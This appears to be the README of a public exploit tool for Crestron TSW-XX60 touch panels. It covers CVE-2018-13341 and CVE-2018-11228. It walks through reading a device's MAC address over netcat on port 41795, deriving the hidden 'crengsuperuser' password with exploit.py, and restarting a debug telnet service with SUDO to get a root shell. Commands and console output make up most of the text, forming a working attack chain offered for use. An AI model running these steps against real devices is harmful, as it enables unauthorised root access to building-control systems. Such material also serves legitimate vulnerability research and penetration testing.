# CVE-2018-13341
This Tool Aims to Exploit the CVE-2018-13341, By Using the MAC address of the targeted device, you can recover the password of the *"crengsuperuser"* hidden account which has elevated privileges and allow you to run **SUDO** commands.


The Crestron Toolbox Protocol (CTP) can be connected to by accessing port **41795** on the TSW-XX60 device.

```bash
# nc -C w.x.y.z 41795
TSW-760 Control Console

TSW-760> estat

The EST command has been made obsolete. Please use IPCONFIG instead.
Ethernet Adapter [XYZ]:
	Link Status ....... : OK
	DHCP .............. : ON
	MAC Address ....... : 00.XX.XX.XX.XX.XX
	IP Address ........ : [removed]
	Subnet Mask ....... : [removed]
	IPV6 Address ...... : [removed]
	Default Gateway ... : [removed]


	DNS Servers ........ : [removed]    | DHCP      |
	                       [removed]    | DHCP      |
```

## Requirements

This tool requires the CryptoGraphy module.

```bash
# pip3 install cryptography
```
**OR**
```bash
# pip3 install -r requirements.txt
```

## Getting Started

```bash
usage: exploit.py [-h] [-m MAC]


# Example
# python3 exploit.py -m aabbccddeeff
[*] Device MAC address: AAXXYYZZ
[*] Password for 'crengsuperuser': somerandompass
```

## Exploiting the CVE-2018-11228

The [CVE-2018-11228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-11228) allows unauthenticated RCE via Bash Shell Service in Crestron Terminal Protocol (*CTP*). After getting the password of the *"crengsuperuser"* hidden account you can get a **root** access on the Machine.

```bash
# nc -C w.x.y.z 41795

TSW-760 Control Console

TSW-760> TELNETPORT OFF
Telnet Port: Off
TSW-760> SUDO RESTARTSERVICE telnetd_debug
Username: crengsuperuser
Password: **************

Service telnetd_debug restarted

TSW-760>
```

Then, in a new shell, you can get **root** access on the box.

```bash
# telnet w.x.y.z

bash# whoami
root
```

```
Credit Goes to : axcheron 
```
